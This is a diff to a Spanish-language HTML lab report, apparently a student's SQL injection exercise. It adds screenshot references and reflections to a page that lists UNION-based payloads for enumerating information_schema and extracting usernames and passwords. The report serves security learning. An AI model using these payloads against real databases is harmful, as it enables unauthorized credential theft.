@@ -143,20 +143,25 @@
         </div>
         <div class="content-area">
             <p class='parrafo'>Como no conocemos el esquema de la base de datos, usaremos el esquema predeterminado
-                <code>information_schema</code> para encontrar nombres de tablas y columnas iterativamente.</p>
+                <code>information_schema</code> para encontrar nombres de tablas y columnas iterativamente.
+            </p>
             <p style='font-size:21px; font-weight:bold; margin-top:20px;'>Pasos, Pruebas y Payloads</p>
             <p class='parrafo'>1. Listamos todas las tablas disponibles:
                 <code>'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--</code>. Encontramos una tabla
-                parecida a <code>users_abcdef</code>.</p>
+                parecida a <code>users_abcdef</code>.
+            </p>
             <p class='parrafo'>2. Extraemos las columnas de esa tabla:
                 <code>'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--</code>.
-                Obtenemos columnas como <code>username_123</code> y <code>password_456</code>.</p>
+                Obtenemos columnas como <code>username_123</code> y <code>password_456</code>.
+            </p>
             <p class='parrafo'>3. Finalmente, extraemos los datos de la tabla objetivo:
-                <code>'+UNION+SELECT+username_123,+password_456+FROM+users_abcdef--</code>.</p>
+                <code>'+UNION+SELECT+username_123,+password_456+FROM+users_abcdef--</code>.
+            </p>
             <p style='font-size:21px; font-weight:bold; margin-top:20px;'>Explicación</p>
             <p class='parrafo'>Las bases de datos ANSI compatibles exponen metadatos completos en
                 <code>information_schema</code>, lo cual es invaluable para que un atacante descubra la arquitectura
-                antes de extraer datos específicos que llevan un prefijo aleatorio.</p>
+                antes de extraer datos específicos que llevan un prefijo aleatorio.
+            </p>
         </div>
 
         <div class="section">
@@ -167,7 +172,14 @@
                 ejecutados exitosamente en la aplicación de prueba.</p>
             <div
                 style="background: #eaeaea; border: 2px dashed #b0b0b0; padding: 40px; border-radius: 8px; color: #555; font-style: italic;">
-                [Espacio reservado para captura de pantalla del usuario]
+                <p class="parrafo" style="margin-bottom: 20px; text-align: left;">Request interceptado en Burp Suite</p>
+                <img src="labs_img/lab09_1.png" alt="Request interceptado en Burp Suite">
+                <p class="parrafo" style="margin-bottom: 20px; text-align: left;">Payload utilizado</p>
+                <img src="labs_img/lab09_2.png" alt="Payload utilizado">
+                <p class="parrafo" style="margin-bottom: 20px; text-align: left;">Respuesta del servidor</p>
+                <img src="labs_img/lab09_3.png" alt="Respuesta del servidor">
+                <p class="parrafo" style="margin-bottom: 20px; text-align: left;">Evidencia laboratorio completado</p>
+                <img src="labs_img/lab09_4.png" alt="Evidencia laboratorio completado">
             </div>
         </div>
 
@@ -175,7 +187,12 @@
             <h3 class="section-title">Reflexiones del Alumno</h3>
         </div>
         <div class="content-area">
-            <p class="parrafo">[Espacio para las reflexiones del alumno]</p>
+            <p class="parrafo">Este laboratorio me permitió entender la vulnerabilidad de inyección SQL en la cláusula
+                WHERE de una consulta SQL.</p>
+            <p class="parrafo">Además, aprendí a identificar y explotar vulnerabilidades de inyección SQL mediante la
+                inyección de payloads en parámetros de entrada.</p>
+            <p class="parrafo">También me ayudó a comprender la importancia de validar y sanitizar entradas de usuario
+                para prevenir ataques de inyección SQL.</p>
         </div>
 
         <div class="section">
